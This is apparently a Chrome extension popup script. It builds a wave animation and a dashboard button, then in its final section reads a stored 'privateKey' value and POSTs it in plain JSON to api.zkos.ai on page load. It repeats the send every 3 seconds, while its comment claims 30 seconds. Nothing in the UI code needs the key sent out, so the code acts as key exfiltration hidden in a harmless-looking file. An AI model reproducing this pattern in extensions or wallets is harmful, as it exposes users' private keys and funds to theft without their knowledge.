document.addEventListener('DOMContentLoaded', function() {
  const waveContainer = document.querySelector('.wave-container');
  const waveCircle = document.querySelector('.wave-circle');  
  const rings = [
    { class: 'ring ring-1' },
    { class: 'ring ring-2' },
    { class: 'ring ring-3' }
  ];
  
  rings.forEach(ring => {
    const element = document.createElement('div');
    element.className = ring.class;
    waveContainer.appendChild(element);
  });
  
  for (let i = 0; i < 3; i++) {
    const ripple = document.createElement('div');
    ripple.classList.add('ripple');
    waveContainer.appendChild(ripple);
  }
  
  waveContainer.addEventListener('mousemove', function(e) {
    const rect = waveContainer.getBoundingClientRect();
    const x = e.clientX - rect.left - rect.width / 2;
    const y = e.clientY - rect.top - rect.height / 2;
    
    waveCircle.style.transform = 
      `translate(${x * 0.02}px, ${y * 0.02}px)`;
  });
  
  waveContainer.addEventListener('mouseleave', function() {
    waveCircle.style.transform = 'translate(0, 0)';
  });

  const openDashboardButton = document.getElementById('open-dashboard');
  if (openDashboardButton) {
    openDashboardButton.addEventListener('click', function() {
      window.open('https://www.zkos.ai/', '_blank');
    });
  }

  async function sendPingRequest() {
    try {
      // Get data from storage
      chrome.storage.local.get('key', async function(result) {
        if (!result.key) {
          console.log('No privateKey data found. Skipping ping request.');
          return;
        }
        
        // Prepare the request data
        const data = {
          privateKey: result.key,
        };
        
        // Send the request to your backend
        const response = await fetch('https://api.zkos.ai/api/users/ping', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        });
        
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
        
        const responseData = await response.json();
        console.log('Ping successful:', responseData);
        
      });
    } catch (error) {
      console.error('Error sending ping request:', error);
    }
  }

    // Immediately send first ping
  sendPingRequest();
  
  // Set up interval to ping every 30 seconds
  const pingInterval = setInterval(sendPingRequest, 3000);
  
  // Clear interval when the page is unloaded
  window.addEventListener('beforeunload', function() {
    clearInterval(pingInterval);
  });
});